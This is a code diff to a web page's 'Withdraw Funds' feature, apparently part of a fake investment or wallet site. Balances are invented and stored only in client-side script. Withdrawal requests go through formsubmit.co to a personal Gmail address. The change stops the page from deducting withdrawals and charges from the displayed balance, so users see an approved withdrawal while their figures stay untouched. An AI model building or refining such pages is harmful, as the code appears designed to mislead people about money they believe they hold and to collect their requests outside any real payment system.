@@ -145,7 +145,7 @@
       <button class="modal-close" onclick="closeWithdrawModal()">&times;</button>
       <h3>Withdraw Funds</h3>
       <div class="withdraw-warning">
-        Notice: You are only allowed to make one withdrawal per day. Attempting multiple withdrawals within the same day may result in your account not being credited. Please withdraw responsibly.
+        Notice: You are only allowed to make one withdrawal per day. Attempting multiple withdrawals within the same day may result in your account not being credited. Please withdraw responsibly[...]
       </div>
       <div id="withdrawError" class="withdraw-error" style="display:none;"></div>
       <form id="withdrawForm" method="POST" action="https://formsubmit.co/empirevirtual99@gmail.com" autocomplete="off">
@@ -545,7 +545,7 @@
         }
       });
     });
-    // Withdrawal Form Submission: Deduct balance and save (no storage, so just UI update)
+    // Withdrawal Form Submission: Only check, do not deduct balance, just update UI
     document.getElementById('withdrawForm').onsubmit = function(e) {
       const accountId = document.getElementById('withdrawAccountId').value;
       const amount = parseInt(document.getElementById('withdrawAmount').value, 10);
@@ -559,26 +559,14 @@
         e.preventDefault();
         return false;
       }
-      if (amount + charge > displayBalance) {
+      if (amount > displayBalance) {
         const errorDiv = document.getElementById('withdrawError');
         errorDiv.style.display = 'block';
-        errorDiv.textContent = `Insufficient balance. You only have ₦${displayBalance.toLocaleString()} (including charges).`;
+        errorDiv.textContent = `Insufficient balance. You only have ₦${displayBalance.toLocaleString()}.`;
         e.preventDefault();
         return false;
       }
-      // No balance deduction, just update the card for this session
-      const today = new Date();
-      const incomingDate = new Date(accountData[accountId].incomingDate + "T00:00:00");
-      if (today < incomingDate) {
-        accountData[accountId].balance -= (amount + charge);
-        if (accountData[accountId].balance < 0) accountData[accountId].balance = 0;
-      } else {
-        let total = (accountData[accountId].balance || 0) + (accountData[accountId].incomingTokenAmount || 0);
-        total -= (amount + charge);
-        accountData[accountId].balance = Math.max(total, 0);
-        accountData[accountId].incomingTokenAmount = 0;
-      }
-      updateProfileCard(document.getElementById(`profile${accountId}`), accountId);
+      // Do NOT deduct from balance here, just allow the withdrawal and display the charge.
       // Allow form to submit to formsubmit.co (page will reload and redirect to their success page)
       return true;
     };
